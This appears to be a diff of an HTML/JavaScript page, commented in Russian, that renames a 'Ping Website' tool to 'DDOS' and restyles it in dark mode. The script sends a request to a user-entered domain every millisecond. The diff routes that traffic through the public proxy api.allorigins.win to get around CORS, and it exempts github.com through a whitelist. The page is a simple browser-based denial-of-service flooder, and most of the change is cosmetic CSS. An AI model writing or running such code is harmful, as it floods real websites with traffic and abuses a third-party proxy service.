@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ping Website</title>
+    <title>DDOS</title>
     <style>
-        /* iOS стиль с чёрно-белыми элементами */
+        /* Тёмный iOS стиль */
         body {
             margin: 0;
             padding: 0;
@@ -13,15 +13,15 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f5f5f7;
+            background-color: #1c1c1e;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            color: #333;
+            color: #ffffff;
         }
 
         .container {
-            background-color: #ffffff;
+            background-color: #2c2c2e;
             border-radius: 20px;
-            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.5);
             padding: 40px;
             text-align: center;
             width: 90%;
@@ -39,33 +39,35 @@
         h1 {
             font-size: 1.8em;
             margin-bottom: 20px;
-            color: #1c1c1e;
+            color: #ffffff;
         }
 
         p {
             font-size: 1.2em;
             margin: 10px 0;
-            color: #2c2c2e;
+            color: #ffffff;
         }
 
         span {
             font-weight: bold;
-            color: #007aff;
+            color: #0a84ff;
         }
 
         input[type="text"] {
             padding: 10px;
-            border: 1px solid #d1d1d6;
+            border: 1px solid #5a5a5f;
             border-radius: 10px;
             width: calc(100% - 22px);
             font-size: 1em;
             margin-bottom: 20px;
             outline: none;
             box-sizing: border-box;
+            background-color: #3a3a3c;
+            color: #ffffff;
         }
 
         button {
-            background-color: #007aff;
+            background-color: #0a84ff;
             color: white;
             padding: 10px 20px;
             border: none;
@@ -76,7 +78,7 @@
         }
 
         button:hover {
-            background-color: #005bb5;
+            background-color: #0063ce;
         }
 
         .error {
@@ -84,37 +86,70 @@
             font-size: 0.9em;
         }
 
-        /* Иконки в стиле черно-белых эмодзи */
-        .icon {
-            font-size: 1.5em;
-            color: #1c1c1e;
+        /* Стиль для iOS уведомления */
+        .ios-notification {
+            display: none;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #ff3b30;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            font-size: 1em;
+        }
+
+        .ios-notification.show {
+            display: block;
+            animation: fade-in 0.5s ease;
+        }
+
+        @keyframes fade-in {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="eye-icon.png" alt="Logo" class="logo">
-        <h1><span class="icon">🌐</span> Ping Domain</h1>
+        <h1>Ping Domain</h1>
         
-        <input type="text" id="domain-input" placeholder="🔍 Enter domain to ping">
-        <button onclick="startPinging()">🚀 Start Pinging</button>
+        <input type="text" id="domain-input" placeholder="Enter domain to ping">
+        <button onclick="startPinging()">Start Pinging</button>
 
         <p id="error-message" class="error"></p>
-        <p><span class="icon">🖥️</span> Total Requests Sent: <span id="request-count">0</span></p>
-        <p><span class="icon">⏱️</span> Last Response Time: <span id="response-time">0 ms</span></p>
+        <p>Total Requests Sent: <span id="request-count">0</span></p>
+        <p>Last Response Time: <span id="response-time">0 ms</span></p>
+    </div>
+
+    <!-- Уведомление в стиле iOS -->
+    <div id="ios-notification" class="ios-notification">
+        Domain is in the white list!
     </div>
 
     <script>
         let requestCount = 0;
         let intervalId;
-        const whiteList = ["t.me"]; // Белый список доменов
+        const whiteList = ["github.com"]; // Белый список доменов
         const requestCountElem = document.getElementById('request-count');
         const responseTimeElem = document.getElementById('response-time');
         const errorMessageElem = document.getElementById('error-message');
+        const notificationElem = document.getElementById('ios-notification');
 
         function pingDomain(domain) {
             const startTime = Date.now();
-            fetch(`https://${domain}`)
+            // Используем сторонний сервис для пинга, чтобы обойти проблемы CORS
+            const url = `https://api.allorigins.win/get?url=https://${domain}`;
+
+            fetch(url)
                 .then(response => {
                     const endTime = Date.now();
                     const responseTime = endTime - startTime;
@@ -124,6 +159,7 @@
                 })
                 .catch(error => {
                     console.error('Error pinging domain:', error);
+                    errorMessageElem.textContent = `Error: ${error.message}`;
                 });
         }
 
@@ -132,7 +168,7 @@
 
             // Проверка на белый список
             if (whiteList.includes(domainInput)) {
-                errorMessageElem.textContent = `❌ Cannot ping ${domainInput} - domain is in the white list!`;
+                showNotification(`Cannot ping ${domainInput} - domain is in the white list!`);
                 return;
             }
 
@@ -144,6 +180,16 @@
 
             // Пинг каждые 1 миллисекунд
             intervalId = setInterval(() => pingDomain(domainInput), 1);
+        }
+
+        function showNotification(message) {
+            notificationElem.textContent = message;
+            notificationElem.classList.add('show');
+
+            // Убираем уведомление через 3 секунды
+            setTimeout(() => {
+                notificationElem.classList.remove('show');
+            }, 3000);
         }
     </script>
 </body>
